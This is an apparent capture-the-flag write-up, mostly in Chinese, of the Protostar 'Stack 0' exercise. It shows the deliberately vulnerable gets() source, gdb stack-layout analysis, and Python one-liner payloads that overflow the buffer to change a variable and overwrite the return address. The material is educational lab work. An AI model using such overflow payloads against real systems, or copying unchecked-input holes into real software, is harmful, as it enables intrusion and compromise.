# Stack 0

## （一） 题目：

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid    out, and that modifying outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0

source code:

\#include &lt;stdlib.h&gt;

\#include &lt;unistd.h&gt;

\#include &lt;stdio.h&gt;

int main\(int argc, char \*\*argv\)

{

volatile int modified;

char buffer\[64\];

modified = 0;

gets\(buffer\);

if\(modified != 0\) {

```
  printf\("you have changed the 'modified' variable\n"\);
```

} else {

```
  printf\("Try again?\n"\);
```

}

}

## （二）解题过程：

```
 This problem is about how to layout the stack in memory
```

```
 这是典型的栈溢出攻击。知识点在于缓冲区溢出时候，变量在内存中的布局。
```

![](/png/01.png)

1）手工测试

思路，通过从小到大的输入得出栈帧的布局，理清如何修改边界值从而修改程序的执行流程。

当modified变量=0时候，输出try again

modified=1,输出 变量modified修改。

当buffer输入aaaa时候，输出try again，modified=0

输入边界64个a时候输出try again，modified=0

输入buffer为65时候

![](/png/02.png)

可以通过修改buffer的长度来修改modified变量的值。

这就是典型的缓冲区溢出。栈布局如下：

栈顶

buffer\[64\] 第二个变量

modified    第一个变量

上一个栈帧ebp

返回地址

```
argc

  argv
```

栈底

```
    程序中包含两个变量，一个modified，被声明为volatile，这个标识符表示每次使用modified变量都从内存中读取值，而不是使用cache中保存的值；还有一个变量buffer，占用64个字节的空间。程序使用gets函数读取用户输入，并保存到buffer中，之后根据modified变量的值决定if语句的执行逻辑。
```

按照正常情况，由于modified使用等于0，因此程序应该使用输出"Try again?"，但是由于在获取用户输入时没有判断用户输入数据的大小，因此用户可能会输入大于64个字节的内容，造成栈溢出。那么我们怎么通过这个栈溢出漏洞修改modified的值，从而修改if语句的执行逻辑呢？

用反汇编工具跟踪调试如下：

gdb ./stack0

在程序的第十三行下断点，跟踪调试

b 13![](/png/03.png)

此时栈帧的布局如上：

esp 0xbffffcc0

esp+1c buff\[0-3\]  buff起始地址

esp+5c modified=0  modified地址

ebp   0xbffffd28

修改流程，可以尝试填充buff，覆盖modified值。计算一下两者相差多少个字节。相差0x40个，也就是64个，所以我们试着填充65个。查看此时的内存布局

![](/png/04.png)

esp+5c处的modified值变为了非0，程序的分支流程被修改，输出也变化了。 如果我们继续输入超过64个字节的内容，就会覆盖modified变量的值，但是要注意不要超过变量modified的位置，否则会覆盖其他关键信息\(例如返回地址\)，使程序崩溃。

2）利用工具自动化实现

1） 用python脚本探测漏洞触发点。![](/png/05.ppng.PNG) 因为要在程序执行过程中处理用户输入的问题，所以使用subprocess模块。

![](/png/06.png)

覆盖成1或者其他非0值

```
$ python -c 'print "A"\*0x40+"\x01\x00\x00\x00"' \| ./stack0

you have changed the 'modified' variable

$ python -c 'print "A"\*0x40+"\x01"' \| ./stack0

you have changed the 'modified' variable
```

覆盖返回地址

发现buffer距离返回地址是0x54,后面改为要覆盖的地址即可

，返回地址处0xb7eadcXX

$ python -c 'print "A"\*0x50+"\x19\x84\x04\x08"' \| ./stack0  
    you have changed the 'modified' variable  
    you have changed the 'modified' variable  
    Segmentation fault  
    $ python -c 'print "\x00"\*0x50+"\x19\x84\x04\x08"' \| ./stack0  
    Try again?  
    you have changed the 'modified' variable  
    Segmentation fault  


![](/png/07.png)



当返回地址被修改后，就会出现段错误。需要对返回地址进行修改，修改成可以利用的地址。

Ref：

[https://exploit.education/phoenix/stack-zero/](https://exploit.education/phoenix/stack-zero/)

[https://blog.csdn.net/guilanl/article/details/61916375](https://blog.csdn.net/guilanl/article/details/61916375)

